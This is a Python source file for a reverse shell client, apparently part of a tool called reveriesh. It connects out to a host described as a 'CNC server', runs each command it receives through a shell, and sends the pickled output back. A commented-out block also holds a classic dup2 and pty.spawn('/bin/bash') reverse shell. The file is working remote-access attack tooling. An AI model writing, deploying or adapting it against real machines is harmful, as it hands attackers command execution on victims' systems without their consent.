#!/usr/bin/env python
# -*- coding: utf-8 -*-

""" Really basic reverse shell in python
"""

import os
import sys
import socket
import shlex
import subprocess
import pickle
import pty
from pprint import pprint

from reveriesh.common import SIG_REVERIESH, ascii_format


## Doesn't work right
# def start_client(host, port=80):
#     if host is None:
#         raise ValueError("must specify host")
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.connect((host, port))
#     os.dup2(s.fileno(), 0)
#     os.dup2(s.fileno(), 1)
#     os.dup2(s.fileno(), 2)
#
#     pty.spawn("/bin/bash")

class ShellRunner(object):

    @staticmethod
    def cmd(data):
        # type: (bytes) -> bytes
        commandstr = data.decode()
        if commandstr[:2] == 'cd':
            return ShellRunner.cd(commandstr[3:])
        if commandstr[:2] == 'to':
            return ShellRunner.to(commandstr[3:])

        if len(data) == 0:
            return ShellRunner.fmt_prompt()

        return ShellRunner.run_cmd(commandstr)

    @staticmethod
    def cd(dirname):
        os.chdir(dirname)
        return ShellRunner.pack_dict()

    @staticmethod
    def to(dirname):
        os.chdir(dirname)
        return ShellRunner.run_cmd('ls')

    @staticmethod
    def run_cmd(commandstr):
        cmd = subprocess.Popen(shlex.split(commandstr),
                               shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        out = cmd.stdout.read()
        err = cmd.stderr.read()

        if err:
            print(ascii_format(err.decode(), 91))
        print(ascii_format(out.decode()))
        # output_str = str(output_bytes, "utf-8")
        # sock.send(str.encode(output_str + str(os.getcwd()) + '> '))
        # print(output_str)
        return ShellRunner.pack_dict(out, err)


    @staticmethod
    def fmt_prompt():
        # type: () -> bytes
        s = '\n{host}:{cwd}> '.format(host=socket.gethostname(),
                                       cwd=os.getcwd())
        return ascii_format(s, 42).encode()
        # return pickle.dumps(d)

    @staticmethod
    def pack_dict(out=b'', err=b''):
        d = {'out': out, 'err': err, 'prompt': ShellRunner.fmt_prompt()}
        return pickle.dumps(d)


class ReverseShellClient(object):
    def __init__(self, host="", port=80):
        self.host = host
        self.port = port
        self._kill_count = 0
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)

        self.socket_connect()
        print("<> starting on {}:{}".format(host, port))
        self.run()

    def socket_connect(self):
        try:
            print("Binding socket to port: " + str(self.port))
            self.sock.connect((self.host, self.port))
            print("Successfully connected to host: " + str(self.host))
        except socket.error as msg:
            print("Socket binding error: \n{}\n".format(msg))
            sys.exit(1)
            # socket_bind()

    def close(self):
        pass

    def quit(self, code=0):
        self.close()
        print(ascii_format("buh-bye", 45))
        sys.exit(code)

    def run(self):
        while True:
            try:
                res = self.receive_commands()
                if res:
                    self._kill_count = 0
            except KeyboardInterrupt:
                if self._kill_count > 0:
                    self.quit()
                print(
                    '<!> keyboard interrupt issued. Press Ctrl-C twice in a row '
                    'to quit client')
                self._kill_count += 1
        self.sock.close()

    # Receive commands from remote server and run on local machine
    def receive_commands(self):
        data = self.sock.recv(1024)
        if data == SIG_REVERIESH.KILL:
            self.quit()
        if data == SIG_REVERIESH.PROMPT:
            self.sock.send(ShellRunner.pack_dict())
            return True
        print(ascii_format(data.decode(), 100))
        infodata = ShellRunner.cmd(data)
        self.sock.send(infodata)
        return True



if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='python reverse shell')

    parser.add_argument("-ch", "--check", action="store_true",
                        help="health check server")

    parser.add_argument(
        "-p", "--port", default=80, action="store", type=int,
        help="port of CNC server")
    parser.add_argument(
        "host", nargs='?', default="localhost", type=str, action="store",
        help="Host of CNC server")

    args = parser.parse_args()
    # start_client(args.host, args.port)
    client = ReverseShellClient(args.host, args.port)
